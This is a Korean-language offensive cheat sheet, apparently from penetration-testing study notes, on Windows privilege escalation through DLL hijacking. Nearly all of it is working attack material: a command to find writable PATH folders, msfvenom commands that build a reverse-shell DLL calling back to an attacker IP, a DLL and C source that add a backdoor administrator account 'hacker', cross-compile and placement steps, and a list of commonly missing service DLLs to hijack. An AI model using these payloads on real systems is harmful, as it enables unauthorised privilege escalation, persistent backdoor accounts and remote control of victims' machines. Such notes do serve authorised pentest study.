# 05_DLL_Hijacking

# 윈도우 권한상승 — DLL Hijacking

프로그램이 로드하려는 DLL이 없거나 쓰기 가능한 경로에 있을 때 악성 DLL 삽입.

---

## 탐지

```bash
:: PATH에 쓰기 가능한 경로 확인
for %A in ("%path:;=";"%") do ( ^
  cmd.exe /c icacls "%~A" 2>nul ^
  | findstr /i "(F) (M) (W)" ^
  | findstr /i ":\\ everyone authenticated users todos" ^
  && echo Writable: %~A )
```

Process Monitor (ProcMon, GUI):

```
필터 설정:
  Result = NAME NOT FOUND
  Path ends with .dll
→ 누락된 DLL 위치 및 이름 식별
```

---

## 악성 DLL 생성

```bash
# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<칼리IP> LPORT=4444 \
  -f dll -o evil.dll

# 사용자 추가 DLL
msfvenom -p windows/x64/exec \
  CMD='net user hacker P@ss123 /add && net localgroup administrators hacker /add' \
  -f dll -o evil.dll
```

```c
// 수동 작성 (C)
// evil.c
#include<windows.h>
BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user hacker P@ss123 /add");
        ExitThread(0);
    }
    return TRUE;
}
```

```bash
# Linux에서 크로스 컴파일
x86_64-w64-mingw32-gcc evil.c -shared -o evil.dll -lws2_32
i686-w64-mingw32-gcc evil.c -shared -o evil32.dll
```

---

## 배치 및 트리거

```bash
:: 쓰기 가능한 PATH 경로에 DLL 복사
copy evil.dll C:\Windows\evil.dll

:: 서비스 재시작 또는 프로그램 재실행으로 트리거
net stop <서비스> && net start <서비스>
```

---

## 유명 누락 DLL

| DLL | 서비스 | OS |
| --- | --- | --- |
| wlbsctrl.dll | IKEEXT | Win7/8 |
| TSMSISrv.dll | SessionEnv | Win7 |
| TSVIPSrv.dll | SessionEnv | Win7 |